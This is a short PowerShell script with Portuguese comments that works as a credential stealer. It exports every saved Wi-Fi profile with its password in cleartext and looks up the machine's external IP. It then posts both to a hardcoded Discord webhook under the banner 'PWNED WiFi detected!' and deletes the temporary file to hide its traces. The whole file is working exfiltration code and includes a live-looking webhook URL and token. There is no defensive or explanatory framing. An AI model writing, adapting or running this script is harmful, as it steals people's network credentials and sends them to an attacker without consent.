# Coleta das informações de rede Wi-Fi
$wifiProfiles = netsh wlan export profile key=clear

# Criação do arquivo temporário para armazenar as informações
$wifiFile = "$env:TEMP\wifi.txt"
$wifiProfiles | Out-File -FilePath $wifiFile

# Coleta do IP externo
$ip = Invoke-RestMethod "http://myexternalip.com/raw"

# Webhook Discord
$webhookUrl = "https://discord.com/api/webhooks/1163945552556335248/2grUaOZierXldHcH2vuCbPmutvlPf6znNg22Ms87dyFRZbGv_Quk2NgbDYtPXFfZ63nu"

# Formatação da mensagem que será enviada ao Discord
$message = @{
    content = "PWNED WiFi detected! IP: $ip"
    embeds = @(
        @{
            title = "WiFi Information"
            description = Get-Content -Path $wifiFile | Out-String
            color = 16711680  # Red color for the embed
        }
    )
}

# Envia os dados para o Discord
try {
    $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body ($message | ConvertTo-Json -Depth 3) -ContentType "application/json"
    Write-Host "Mensagem enviada com sucesso: $($response | Out-String)"
} catch {
    Write-Host "Erro ao enviar a mensagem: $_"
}

# Apaga o arquivo temporário
Remove-Item -Path $wifiFile -Force
